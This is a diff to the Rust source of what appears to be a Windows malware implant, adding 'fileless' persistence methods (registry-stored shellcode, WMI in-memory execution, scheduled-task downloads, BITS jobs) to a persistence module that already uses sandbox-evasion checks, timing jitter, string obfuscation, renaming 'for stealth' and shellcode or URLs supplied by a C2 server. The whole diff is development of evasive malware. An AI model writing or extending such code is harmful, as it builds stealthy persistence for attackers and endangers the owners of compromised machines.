@@ -33,6 +33,14 @@ pub enum PersistenceMethod {
     /// COM Hijacking (previously WMI, renamed internally for stealth)
     WmiEvent,
     StartupFolder,
+    /// FILELESS: Registry shellcode (100% memory-resident)
+    RegistryShellcode,
+    /// FILELESS: WMI memory execution
+    WmiMemoryExec,
+    /// FILELESS: Scheduled task with download
+    ScheduledTaskDownload,
+    /// FILELESS: BITS job persistence
+    BitsJobPersistence,
 }
 
 impl PersistenceMethod {
@@ -42,8 +50,24 @@ impl PersistenceMethod {
             "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
             "wmi" | "com" => Some(PersistenceMethod::WmiEvent), // "com" alias added
             "startup" => Some(PersistenceMethod::StartupFolder),
+            // Fileless methods
+            "regshell" | "registryshellcode" => Some(PersistenceMethod::RegistryShellcode),
+            "wmimem" | "wmimemoryexec" => Some(PersistenceMethod::WmiMemoryExec),
+            "taskdl" | "scheduledtaskdownload" => Some(PersistenceMethod::ScheduledTaskDownload),
+            "bits" | "bitsjob" => Some(PersistenceMethod::BitsJobPersistence),
             _ => None,
         }
+    }
+    
+    /// Returns true if this is a fileless persistence method
+    pub fn is_fileless(&self) -> bool {
+        matches!(
+            self,
+            PersistenceMethod::RegistryShellcode
+                | PersistenceMethod::WmiMemoryExec
+                | PersistenceMethod::ScheduledTaskDownload
+                | PersistenceMethod::BitsJobPersistence
+        )
     }
 }
 
@@ -744,6 +768,9 @@ fn environment_check() -> bool {
 
 /// Establece persistencia usando el método especificado
 /// Includes environment keying to avoid sandbox detection
+/// 
+/// **Fileless methods**: For fileless persistence methods (registry shellcode, WMI memory exec, etc.),
+/// this function will NOT copy files to disk. Instead, it uses in-memory techniques only.
 pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
     #[cfg(not(target_os = "windows"))]
     {
@@ -758,23 +785,54 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
             return Ok("OK".to_string());
         }
 
-        // Obtener ruta en ubicación persistente
-        let exe_path = get_current_exe_path()?;
-
         // Small timing jitter before persistence operation
         let jitter_ms = 50 + (get_machine_index() % 100) as u64;
         std::thread::sleep(std::time::Duration::from_millis(jitter_ms));
+
+        // Check if this is a fileless method
+        if method.is_fileless() {
+            // For fileless methods, delegate to persistence_fileless module
+            use crate::persistence_fileless;
+            
+            debug_print!("[PERSIST] Using fileless persistence method: {:?}", method);
+            
+            // Convert to fileless method enum
+            let fileless_method = match method {
+                PersistenceMethod::RegistryShellcode => 
+                    persistence_fileless::FilelessPersistenceMethod::RegistryShellcode,
+                PersistenceMethod::WmiMemoryExec => 
+                    persistence_fileless::FilelessPersistenceMethod::WmiMemoryExec,
+                PersistenceMethod::ScheduledTaskDownload => 
+                    persistence_fileless::FilelessPersistenceMethod::ScheduledTaskDownload,
+                PersistenceMethod::BitsJobPersistence => 
+                    persistence_fileless::FilelessPersistenceMethod::BitsJobPersistence,
+                _ => unreachable!(),
+            };
+            
+            // For fileless methods, we need shellcode or download URL
+            // This would be provided by the C2 server or builder
+            // For now, return an error indicating configuration is needed
+            let config = persistence_fileless::FilelessConfig::default();
+            
+            return persistence_fileless::establish_fileless_persistence(fileless_method, &config);
+        }
+
+        // Traditional (file-based) persistence methods
+        // Obtener ruta en ubicación persistente
+        let exe_path = get_current_exe_path()?;
 
         match method {
             PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
             PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
             PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
             PersistenceMethod::StartupFolder => persist_startup_folder(&exe_path),
+            _ => Err("Method not supported in traditional persistence".to_string()),
         }
     }
 }
 
 /// Remueve persistencia (limpieza completa)
+/// Now includes fileless persistence cleanup
 #[cfg(target_os = "windows")]
 pub fn remove_persistence() -> Result<String, String> {
     use std::fs;
@@ -783,6 +841,17 @@ pub fn remove_persistence() -> Result<String, String> {
     let schtasks_exe = obfstr!("schtasks").to_string();
     let ps_exe = obfstr!("powershell").to_string();
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+
+    // ====================================================================
+    // FILELESS PERSISTENCE CLEANUP
+    // ====================================================================
+    
+    use crate::persistence_fileless;
+    let _ = persistence_fileless::remove_fileless_persistence();
+
+    // ====================================================================
+    // TRADITIONAL PERSISTENCE CLEANUP
+    // ====================================================================
 
     // Registry Run - multiple possible names
     let reg_names = [
